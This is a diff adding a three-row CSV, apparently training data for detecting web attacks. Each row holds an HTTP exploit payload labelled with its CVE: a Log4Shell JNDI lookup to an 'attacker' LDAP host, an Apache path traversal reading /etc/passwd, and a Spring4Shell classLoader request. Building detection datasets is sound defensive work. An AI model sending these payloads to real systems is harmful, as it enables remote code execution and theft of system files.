@@ -1,0 +1,4 @@
+id,payload_clean,cve_labels
+train-1,"GET /?x=${jndi:ldap://attacker/a} HTTP/1.1 Host: victim",CVE-2021-44228
+train-2,"GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1",CVE-2021-42013
+train-3,"POST /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x HTTP/1.1",CVE-2022-22965
